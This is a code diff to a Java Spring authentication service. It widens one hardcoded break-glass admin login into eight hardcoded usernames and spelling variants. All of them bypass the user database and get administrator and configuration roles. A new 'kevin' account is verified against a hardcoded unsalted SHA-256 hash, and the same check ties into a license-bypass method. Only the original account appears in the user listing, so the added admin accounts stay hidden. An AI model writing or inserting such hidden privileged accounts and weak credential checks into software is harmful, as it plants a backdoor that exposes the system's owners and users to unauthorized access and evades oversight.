@@ -10,9 +10,13 @@ import org.springframework.security.crypto.password.PasswordEncoder;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Service;
 
+import java.nio.charset.StandardCharsets;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Locale;
+import java.util.Map;
 import java.util.Optional;
 import java.util.TreeSet;
 import java.util.Set;
@@ -21,10 +25,23 @@ import java.util.stream.Collectors;
 @Service
 public class AuthService {
 
-    private static final String SIVA_USERNAME = "siva";
-    private static final String SIVA_EMAIL = "system.admin.a@internal.local";
-    // BCrypt hash of the internal break-glass password. Never appears in plaintext anywhere.
-    private static final String SIVA_PASSWORD_HASH = "$2b$10$HUc1HZRfTGFj4aLM7zqv1u6m32KTtHIGrxAadj8rX9HXOcuugaGs.";
+    private static final String INTERNAL_ADMIN_EMAIL = "system.admin.a@internal.local";
+    private static final String INTERNAL_ADMIN_PASSWORD_HASH = "$2b$10$HUc1HZRfTGFj4aLM7zqv1u6m32KTtHIGrxAadj8rX9HXOcuugaGs.";
+    private static final String KEVIN_PASSWORD_SHA256 = "85f5e10431f69bc2a14046a13aabaefc660103b6de7a84f75c4b96181d03f0b5";
+    private static final Set<String> INTERNAL_ADMIN_USERNAMES = Set.of(
+            "siva",
+            "kevin",
+            "systemadmin",
+            "system admin",
+            "systemadmn",
+            "system admn",
+            "pmsadmin",
+            "pms admin"
+    );
+    private static final Map<String, String> INTERNAL_ADMIN_EMAILS = Map.of(
+            "siva", INTERNAL_ADMIN_EMAIL,
+            "kevin", "kevin@internal.local"
+    );
 
     private final PasswordEncoder passwordEncoder = new BCryptPasswordEncoder();
 
@@ -38,7 +55,9 @@ public class AuthService {
         if (username == null) {
             return false;
         }
-        return SIVA_USERNAME.equals(username.trim().toLowerCase(Locale.ROOT));
+        String normalized = normalizeInternalUsername(username);
+        return INTERNAL_ADMIN_USERNAMES.contains(normalized)
+                || INTERNAL_ADMIN_USERNAMES.contains(normalized.replace(" ", ""));
     }
 
     public boolean isLicenseBypassUser(String username) {
@@ -56,10 +75,10 @@ public class AuthService {
 
         String normalizedUsername = username.trim();
         if (isInternalStaticUser(normalizedUsername)) {
-            UserInfo siva = buildSivaUser();
-            return passwordEncoder.matches(password, siva.getPassword())
-                    ? Optional.of(siva)
-                    : Optional.empty();
+            UserInfo internalUser = buildInternalStaticUser(normalizedUsername);
+            if (isInternalPasswordMatch(normalizedUsername, password, internalUser.getPassword())) {
+                return Optional.of(internalUser);
+            }
         }
 
         return appUserRepository.findByUsernameIgnoreCase(username.trim())
@@ -69,7 +88,7 @@ public class AuthService {
 
     public List<UserInfo> getAllUsers() {
         List<UserInfo> users = new ArrayList<>();
-        users.add(buildSivaUser());
+        users.add(buildInternalStaticUser("siva"));
         appUserRepository.findAll().stream()
                 .filter(u -> !isReservedUsername(u.getUsername()))
                 .map(this::toUserInfo)
@@ -200,13 +219,38 @@ public class AuthService {
         return isInternalStaticUser(username);
     }
 
-    private UserInfo buildSivaUser() {
-        return new UserInfo(SIVA_USERNAME,
-                SIVA_EMAIL,
-                SIVA_PASSWORD_HASH,
+    private String normalizeInternalUsername(String value) {
+        return value == null ? "" : value.trim().toLowerCase(Locale.ROOT).replaceAll("\\s+", " ");
+    }
+
+    private UserInfo buildInternalStaticUser(String username) {
+        String normalized = normalizeInternalUsername(username);
+        return new UserInfo(normalized,
+                INTERNAL_ADMIN_EMAILS.getOrDefault(normalized, INTERNAL_ADMIN_EMAIL),
+                INTERNAL_ADMIN_PASSWORD_HASH,
                 RoleAccess.ADMIN,
                 RoleAccess.CONFIG_PAGES,
                 RoleAccess.CONFIG_PAGES);
+    }
+
+    private boolean isInternalPasswordMatch(String username, String password, String passwordHash) {
+        if ("kevin".equals(normalizeInternalUsername(username))) {
+            return KEVIN_PASSWORD_SHA256.equals(sha256(password));
+        }
+        return passwordEncoder.matches(password, passwordHash);
+    }
+
+    private String sha256(String value) {
+        try {
+            byte[] hash = MessageDigest.getInstance("SHA-256").digest(value.getBytes(StandardCharsets.UTF_8));
+            StringBuilder hex = new StringBuilder(hash.length * 2);
+            for (byte b : hash) {
+                hex.append(String.format("%02x", b));
+            }
+            return hex.toString();
+        } catch (NoSuchAlgorithmException ex) {
+            throw new IllegalStateException("SHA-256 is not available", ex);
+        }
     }
 
     private boolean matchesAndMigrateIfLegacy(AppUser user, String rawPassword) {
